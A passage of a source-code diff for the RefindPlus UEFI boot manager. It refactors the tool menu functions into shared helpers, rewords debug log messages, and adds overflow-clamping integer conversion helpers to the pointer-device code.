(LOADER_ENTRY ***) &GPTSyncEntryItems\n+    );\n } // static BOOLEAN ShowInfoGPTSync()\n \n static\n BOOLEAN ShowInfoGDisk (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_PART  );\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_GDISK            );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT     );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT);\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_GDISK,\n+            BUILTIN_ICON_TOOL_PART\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, GDISK_FILES,\n             ToolPurpose, BUILTIN_ICON_TOOL_PART,\n             TRUE, FALSE, TAG_GDISK\n         );\n \n-        if (GDiskEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < GDiskEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) GDiskEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) GDiskEntryItems,\n+            GDiskEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                GDiskEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &GDiskEntryItems\n+    );\n } // static BOOLEAN ShowInfoGDisk()\n \n static\n BOOLEAN ShowInfoMOK (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_MOK   );\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_MOK              );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT     );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT);\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_MOK,\n+            BUILTIN_ICON_TOOL_MOK\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, MOK_FILES,\n             ToolPurpose, BUILTIN_ICON_TOOL_MOK,\n             FALSE, TRUE, TAG_MOK\n         );\n \n-        if (MOKEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < MOKEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) MOKEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) MOKEntryItems,\n+            MOKEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                MOKEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &MOKEntryItems\n+    );\n } // static BOOLEAN ShowInfoMOK()\n \n static\n BOOLEAN ShowInfoFwUpdate (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_FWUPDATE);\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_FWUPDATE           );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT       );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT  );\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_FWUPDATE,\n+            BUILTIN_ICON_TOOL_FWUPDATE\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, FWUPDATE_FILES,\n             ToolPurpose, BUILTIN_ICON_TOOL_FWUPDATE,\n             FALSE, TRUE, TAG_FWUPDATE\n         );\n \n-        if (FwUpdateEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < FwUpdateEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) FwUpdateEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) FwUpdateEntryItems,\n+            FwUpdateEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                FwUpdateEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &FwUpdateEntryItems\n+    );\n } // static BOOLEAN ShowInfoFwUpdate()\n \n static\n BOOLEAN ShowInfoNetBoot (\n     CHAR16        *ToolPurpose,\n     LOADER_ENTRY **ReturnEntryItem OPTIONAL\n ) {\n-    INTN                       DefaultEntry;\n-    UINTN                      VolumeIndex;\n-    UINTN                      MenuExit;\n-    BOOLEAN                    RetVal;\n-    MENU_STYLE_FUNC            Style;\n-    REFIT_MENU_ENTRY          *ChosenOption;\n-\n     static BOOLEAN             RunOnce = FALSE;\n     static REFIT_MENU_SCREEN  *ToolInfoMenu = NULL;\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n-\n-        ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n-        if (ToolInfoMenu == NULL) {\n-            break;\n-        }\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_THIN_SEP, L\"Prepare Menu Screen\");\n-        ALT_LOG(1, LOG_LINE_NORMAL, L\"Screen Title:- 'Run %s Info'\", ToolPurpose);\n-        #endif\n+        if (RunOnce) break;\n \n-        ToolInfoMenu->TitleImage = BuiltinIcon (BUILTIN_ICON_TOOL_NETBOOT);\n-        ToolInfoMenu->Title      = StrDuplicate (LABEL_NETBOOT           );\n-        ToolInfoMenu->Hint1      = StrDuplicate (SELECT_OPTION_HINT      );\n-        ToolInfoMenu->Hint2      = StrDuplicate (RETURN_MAIN_SCREEN_HINT );\n+        ToolInfoMenu = InitToolMenu (\n+            ToolPurpose,\n+            LABEL_NETBOOT,\n+            BUILTIN_ICON_TOOL_NETBOOT\n+        );\n+        if (ToolInfoMenu == NULL) break;\n \n         FindTool (\n             AllToolLocations, NETBOOT_FILES,\n             ToolPurpose, BUILTIN_ICON_TOOL_NETBOOT,\n             FALSE, TRUE, TAG_NETBOOT\n         );\n \n-        if (NetBootEntryItems == NULL) {\n-            AddMenuInfoLine (ToolInfoMenu, L\"Could *NOT* Find Valid Instance\", FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"  Remove from 'showtools' List\",  FALSE);\n-            AddMenuInfoLine (ToolInfoMenu, L\"\",                                FALSE);\n-        }\n-        else {\n-            for (VolumeIndex = 0; VolumeIndex < NetBootEntryItemsCount; VolumeIndex++) {\n-                AddMenuEntry (\n-                    ToolInfoMenu,\n-                    (REFIT_MENU_ENTRY *) NetBootEntryItems[VolumeIndex]\n-                );\n-            } // for\n-        }\n-\n-        RetVal = GetMenuEntryReturn (&ToolInfoMenu);\n-        if (!RetVal) {\n-            FreeMenuScreen (&ToolInfoMenu);\n-        }\n-    } while (0); // This 'loop' only runs once\n-\n-    if (ToolInfoMenu == NULL) {\n-        RetVal = HandleExitShowInfo();\n-    }\n-    else {\n-        DefaultEntry = 9999; // Use the Max Index\n-        Style = (AllowGraphicsMode) ? GraphicsMenuStyle : TextMenuStyle;\n-        MenuExit = DrawMenuScreen (\n-            ToolInfoMenu, Style,\n-            &DefaultEntry, &ChosenOption\n-        );\n-\n-        #if REFIT_DEBUG > 0\n-        ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n-            MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n+        HandleToolMenu (\n+            &ToolInfoMenu,\n+            (REFIT_MENU_ENTRY **) NetBootEntryItems,\n+            NetBootEntryItemsCount\n         );\n-        LOG_MSG(\"\\n\\n\");\n-        LOG_MSG(\"Received User Input:\");\n-        LOG_MSG(\"%s  - %s\", OffsetNext, ChosenOption->Title);\n-        #endif\n-\n-        if (MenuExit != MENU_EXIT_ENTER || ChosenOption->Tag != TAG_BASE) {\n-            RetVal = FALSE;\n-        }\n-        else {\n-            RetVal = TRUE;\n-\n-            *ReturnEntryItem = CopyLoaderEntry (\n-                NetBootEntryItems[ChosenOption->Row]\n-            );\n-        }\n-    }\n+    } while (0); // This 'loop' only runs once\n \n     RunOnce = TRUE;\n \n-    return RetVal;\n+    return HandleToolSelection (\n+        ToolInfoMenu, ReturnEntryItem,\n+        (LOADER_ENTRY ***) &NetBootEntryItems\n+    );\n } // static BOOLEAN ShowInfoNetBoot()\n \n static\n\n@@ -2999,9 +2577,7 @@\nBOOLEAN ShowInfoCleanNvram (\n \n \n     do {\n-        if (RunOnce) {\n-            break;\n-        }\n+        if (RunOnce) break;\n \n         ToolInfoMenu = AllocateZeroPool (sizeof (REFIT_MENU_SCREEN));\n         if (ToolInfoMenu == NULL) {\n\n@@ -3064,7 +2640,7 @@\nBOOLEAN ShowInfoCleanNvram (\n \n         #if REFIT_DEBUG > 0\n         ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n+            L\"Returned '%d' (%s) from Menu Screen Option ... \\\"%s\\\" in Function:- '%a'\",\n             MenuExit, MenuExitInfo (MenuExit), ChosenOption->Title, __func__\n         );\n         LOG_MSG(\"Received User Input:\");\n\n@@ -5589,7 +5165,7 @@\nEFI_STATUS EFIAPI efi_main (\n             case TAG_ABOUT:    // About RefindPlus\n                 #if REFIT_DEBUG > 0\n                 LOG_MSG(\"Received User Input:\");\n-                LOG_MSG(\"%s  - Show '%s' Screen\", OffsetNext, LABEL_ABOUT);\n+                LOG_MSG(\"%s  - Show '%s' Menu\", OffsetNext, LABEL_ABOUT);\n                 LOG_MSG(\"\\n\\n\");\n                 #endif\n\n@@ -5606,7 +5182,7 @@\nEFI_STATUS EFIAPI efi_main (\n             case TAG_HIDDEN:  // Manage hidden tag entries\n                 #if REFIT_DEBUG > 0\n                 LOG_MSG(\"Received User Input:\");\n-                LOG_MSG(\"%s  - Show '%s' Screen\", OffsetNext, LABEL_HIDDEN);\n+                LOG_MSG(\"%s  - Show '%s' Menu\", OffsetNext, LABEL_HIDDEN);\n                 LOG_MSG(\"\\n\\n\");\n                 #endif\n\n@@ -5650,7 +5226,7 @@\nEFI_STATUS EFIAPI efi_main (\n             case TAG_CSR_ROTATE:\n                 #if REFIT_DEBUG > 0\n                 LOG_MSG(\"Received User Input:\");\n-                LOG_MSG(\"%s  - Show '%s' Screen\", OffsetNext, LABEL_CSR_ROTATE);\n+                LOG_MSG(\"%s  - Show '%s' Menu\", OffsetNext, LABEL_CSR_ROTATE);\n                 #endif\n \n                 // No end dash line ... Expected to return\n\n@@ -5671,7 +5247,7 @@\nEFI_STATUS EFIAPI efi_main (\n             case TAG_BOOTORDER:\n                 #if REFIT_DEBUG > 0\n                 LOG_MSG(\"Received User Input:\");\n-                LOG_MSG(\"%s  - Show '%s' Screen\", OffsetNext, LABEL_BOOTORDER);\n+                LOG_MSG(\"%s  - Show '%s' Menu\", OffsetNext, LABEL_BOOTORDER);\n                 LOG_MSG(\"\\n\\n\");\n                 #endif\n\n@@ -5690,7 +5266,7 @@\nEFI_STATUS EFIAPI efi_main (\n \n                 #if REFIT_DEBUG > 0\n                 LOG_MSG(\"Received User Input:\");\n-                LOG_MSG(\"%s  - Show '%s' Screen\", OffsetNext, LABEL_CLEAN_NVRAM);\n+                LOG_MSG(\"%s  - Show '%s' Menu\", OffsetNext, LABEL_CLEAN_NVRAM);\n                 LOG_MSG(\"\\n\\n\");\n                 #endif\n```\n\nFilename: BootMaster/menu.c:\n```\n@@ -136,7 +136,7 @@\nVOID LogExit (\n     IN  CHAR16     *ChosenOptionTitle\n ) {\n     ALT_LOG(1, LOG_LINE_NORMAL,\n-        L\"Returned '%d' (%s) from Menu Screen \\\"%s\\\" Option in Function:- '%a'\",\n+        L\"Returned '%d' (%s) from Menu Screen Option ... \\\"%s\\\" in Function:- '%a'\",\n         MenuExit, MenuExitInfo (MenuExit), ChosenOptionTitle, FunctionName\n     );\n }\n\n@@ -1749,7 +1749,7 @@\nVOID HideTag (\n     //           - https://sf.net/p/refind/discussion/general/thread/ed3185fb40\n     //           - https://sf.net/p/refind/discussion/general/thread/4dfcdfdd16\n     //           - https://github.com/joevt/RefindPlus/commit/8c303d504d58bb235e9d2218df8bdb939de9ed77\n-    //           - https://github.com/dakanji/RefindPlus/issues/163\n+    //           - https://github.com/RefindPlusRepos/RefindPlus/issues/163\n     //         El Gordo is most likely a buffer overflow of some sort.\n     //         El Gordo might be in one or more filesystem drivers.\n     //         El Gordo might be spread across a number of files.\n```\n\nFilename: BootMaster/pointer.c:\n```\n@@ -372,12 +372,53 @@\nEFI_EVENT pdWaitEvent (\n // Gets the current state of pointer devices and\n // assigns this to the first available device\n ////////////////////////////////////////////////////////////////////////////////\n+static\n+INT32 Int64ToInt32 (\n+    INT64 TempINT64\n+) {\n+    if (TempINT64 > INT32_MAX) return INT32_MAX;\n+    if (TempINT64 < INT32_MIN) return INT32_MIN;\n+\n+    return (INT32) TempINT64;\n+} // static INT32 Int64ToInt32()\n+\n+static\n+UINTN Uint64ToUintn (\n+    UINT64 TempUINT64\n+) {\n+    if (TempUINT64 > UINTN_MAX) return UINTN_MAX;\n+    if (TempUINT64 < UINTN_MIN) return UINTN_MIN;\n+\n+    return (UINTN) TempUINT64;\n+} // static UINTN Uint64ToUintn()\n+\n+static\n+UINTN Int32ToUintn (\n+    INT32 TempINT32\n+) {\n+    if (TempINT32 > UINTN_MAX) return UINTN_MAX;\n+    if (TempINT32 < UINTN_MIN) return UINTN_MIN;\n+\n+    return (UINTN) TempINT32;\n+} // static UINTN Int32ToUintn()\n+\n+static\n+UINTN Int64ToUintn (\n+    INT64 TempINT64\n+) {\n+    if (TempINT64 > UINTN_MAX) return UINTN_MAX;\n+    if (TempINT64 < UINTN_MIN) return UINTN_MIN;\n+\n+    return (UINTN) TempINT64;\n+} // static UINTN Int64ToUintn()\n+\n EFI_STATUS pdUpdateState (VOID) {\n     EFI_STATUS                 Status;\n-    EFI_STATUS                 PointerStatus;\n     UINTN                      Index;\n     INT32                      TargetX;\n     INT32                      TargetY;\n+    INT64                      TempINT64;\n+    UINT64                     TempUINT64;\n     BOOLEAN                    LastHolding;\n     EFI_SIMPLE_POINTER_STATE   SPointerState;\n     EFI_ABSOLUTE_POINTER_STATE APointerState;\n\n@@ -392,80 +433,93 @@\nEFI_STATUS pdUpdateState (VOID) {\n     }\n \n     LastHolding = State.Holding;\n-    Status = EFI_NOT_READY;\n+\n     do {\n         for (Index = 0; Index < NumAPointerDevices; Index++) {\n-            PointerStatus = REFIT_CALL_2_WRAPPER(\n-                ProtocolA[Index]->GetState, ProtocolA[Index], &APointerState\n+            Status = REFIT_CALL_2_WRAPPER(\n+                ProtocolA[Index]->GetState,\n+                ProtocolA[Index], &APointerState\n             );\n-            if (!EFI_ERROR(PointerStatus)) {\n-                State.X = (UINTN) DivU64x64Remainder (\n-                    (UINT64)APointerState.CurrentX * (UINT64)ScreenW,\n-                    (UINT64)ProtocolA[Index]->Mode->AbsoluteMaxX,\n-                    NULL\n-                );\n-                State.Y = (UINTN) DivU64x64Remainder (\n-                    (UINT64)APointerState.CurrentY * (UINT64)ScreenH,\n-                    (UINT64)ProtocolA[Index]->Mode->AbsoluteMaxY,\n-                    NULL\n-                );\n-\n-                State.Holding = (APointerState.ActiveButtons & EFI_ABSP_TouchActive);\n-                Status = EFI_SUCCESS;\n-\n-                break;\n-            } // if !EFI_ERROR(PointerStatus)\n+            if (EFI_ERROR(Status)) {\n+                continue; // 'for' loop\n+            }\n+\n+            TempUINT64 = DivU64x64Remainder (\n+                (UINT64) APointerState.CurrentX *\n+                (UINT64) ScreenW,\n+                (UINT64) ProtocolA[Index]->Mode->AbsoluteMaxX,\n+                NULL\n+            );\n+            State.X = Uint64ToUintn (TempUINT64);\n+\n+            TempUINT64 = DivU64x64Remainder (\n+                (UINT64) APointerState.CurrentY *\n+                (UINT64) ScreenH,\n+                (UINT64) ProtocolA[Index]->Mode->AbsoluteMaxY,\n+                NULL\n+            );\n+            State.Y = Uint64ToUintn (TempUINT64);\n+\n+            State.Holding = (\n+                APointerState.ActiveButtons & EFI_ABSP_TouchActive\n+            );\n+\n+            break; // 'for' loop\n         } // for\n \n         if (!EFI_ERROR(Status)) {\n-            break;\n+            break; // 'do' loop\n         }\n \n         for (Index = 0; Index < NumSPointerDevices; Index++) {\n-            PointerStatus = REFIT_CALL_2_WRAPPER(ProtocolS[Index]->GetState, ProtocolS[Index], &SPointerState);\n-\n-            if (!EFI_ERROR(PointerStatus)) {\n-                TargetX = (INT32)((INT64)State.X + DivS64x64Remainder (\n-                    (INT64)SPointerState.RelativeMovementX * (INT64)GlobalConfig.MouseSpeed,\n-                    (INT64)ProtocolS[Index]->Mode->ResolutionX,\n-                    NULL\n-                ));\n-                TargetY = (INT32)((INT64)State.Y + DivS64x64Remainder (\n-                    (INT64)SPointerState.RelativeMovementY * (INT64)GlobalConfig.MouseSpeed,\n-                    (INT64)ProtocolS[Index]->Mode->ResolutionY,\n-                    NULL\n-                ));\n-\n-                if (TargetX < 0) {\n-                    State.X = 0;\n-                }\n-                else if (TargetX >= ScreenW) {\n-                    State.X = ScreenW - 1;\n-                }\n-                else {\n-                    State.X = TargetX;\n-                }\n-\n-                if (TargetY < 0) {\n-                    State.Y = 0;\n-                }\n-                else if (TargetY >= ScreenH) {\n-                    State.Y = ScreenH - 1;\n-                }\n-                else {\n-                    State.Y = TargetY;\n-                }\n-\n-                State.Holding = SPointerState.LeftButton;\n-                Status = EFI_SUCCESS;\n-\n-                break;\n-            } // if !EFI_ERROR(PointerStatus)\n+            Status = REFIT_CALL_2_WRAPPER(\n+                ProtocolS[Index]->GetState,\n+                ProtocolS[Index], &SPointerState\n+            );\n+            if (EFI_ERROR(Status)) {\n+                continue; // 'for' loop\n+            }\n+\n+            TempINT64 = (INT64) State.X + DivS64x64Remainder (\n+                (INT64) SPointerState.RelativeMovementX *\n+                (INT64) GlobalConfig.MouseSpeed,\n+                (INT64) ProtocolS[Index]->Mode->ResolutionX,\n+                NULL\n+            );\n+            TargetX = Int64ToInt32 (TempINT64);\n+\n+            TempINT64 = (INT64) State.Y + DivS64x64Remainder (\n+                (INT64) SPointerState.RelativeMovementY *\n+                (INT64) GlobalConfig.MouseSpeed,\n+                (INT64) ProtocolS[Index]->Mode->ResolutionY,\n+                NULL\n+            );\n+            TargetY = Int64ToInt32 (TempINT64);\n+\n+            TempINT64 = ScreenW - 1;\n+            if (0);\n+            else if (TargetX < 0)        State.X = 0;\n+            else if (TargetX >= ScreenW) State.X = Int64ToUintn (TempINT64);\n+            else                         State.X = Int32ToUintn (TargetX);\n+\n+            TempINT64 = ScreenH - 1;\n+            if (0);\n+            else if (TargetY < 0)        State.Y = 0;\n+            else if (TargetY >= ScreenH) State.Y = Int64ToUintn (TempINT64);\n+            else                         State.Y = Int32ToUintn (TargetY);\n+\n+            State.Holding = SPointerState.LeftButton;\n+\n+            break; // 'for' loop\n         } // for\n     } while (0); // This 'loop' only runs once\n \n     State.Press = (LastHolding && !State.Holding);\n \n+    if (EFI_ERROR(Status)) {\n+        Status = EFI_NOT_READY;\n+    }\n+\n     return Status;\n } // EFI_STATUS pdUpdateState()\n```\n\nFilename: BootMaster/pointer.h:\n```\n@@ -39,6 +39,16 @@\ntypedef struct PointerStateStruct {\n     BOOLEAN Holding;\n } POINTER_STATE;\n \n+#define INT32_MIN    ((INT32) 0x80000000)         // -2,147,483,648\n+#define INT32_MAX    ((INT32) 0x7FFFFFFF)         //  2,147,483,647\n+\n+#define UINTN_MIN    ((UINTN) 0)                  //  Always 0\n+#if defined(EFI32)\n+#   define UINTN_MAX ((UINTN) 0xFFFFFFFF)         //  4,294,967,295\n+#else\n+#   define UINTN_MAX ((UINTN) 0xFFFFFFFFFFFFFFFF) //  18,446,744,073,709,551,615\n+#endif\n+\n VOID pdInitialize();\n VOID pdCleanup();\n BOOLEAN pdAvailable();\n```\n\nFilename: BootMaster/scan.c:\n```\n@@ -1450,7 +1450,11 @@\nVOID SetLoaderDefaults (\n         ) {\n             BREAD_CRUMB(L\"%a:  5b 1\", __func__);\n             if (GetImage) {\n-                MergeUniqueStrings (&TmpIconName, L\"windows,win,win8\", L',');\n+                MergeUniqueStrings (\n+                    &TmpIconName,\n+                    L\"windows,win8,win\",\n+                    L','\n+                );\n             }\n \n             BREAD_CRUMB(L\"%a:  5b 2\", __func__);\n\n@@ -2266,115 +2270,118 @@\nVOID CleanUpLoaderList (\n     }\n \n     while (LoaderList != NULL) {\n-        Temp = LoaderList;\n+        Temp       = LoaderList;\n         LoaderList = LoaderList->NextEntry;\n         MY_FREE_POOL(Temp->FileName);\n         MY_FREE_POOL(Temp);\n     } // while\n } // static VOID CleanUpLoaderList()\n \n CHAR16 * SetVolKind (\n-    IN CHAR16 *InstanceName,\n-    IN CHAR16 *VolumeName,\n-    IN UINT32  VolumeFSType\n+    IN CHAR16 *EntryName,\n+    IN CHAR16 *VolName,\n+    IN UINT32  VolFSType\n ) {\n     CHAR16 *RetVal;\n \n \n+    // DA-TAG: Order of Appearance is Important\n+    //         Do not trivially change this\n     if (0);\n-    else if (VolumeFSType == FS_TYPE_FAT32         ) RetVal = L\"\"         ;\n-    else if (VolumeFSType == FS_TYPE_FAT16         ) RetVal = L\"\"         ;\n-    else if (VolumeFSType == FS_TYPE_FAT12         ) RetVal = L\"\"         ;\n-    else if (VolumeFSType == FS_TYPE_EXFAT         ) RetVal = L\"\"         ;\n-    else if (MyStriCmp (VolumeName,   L\"EFI\"      )) RetVal 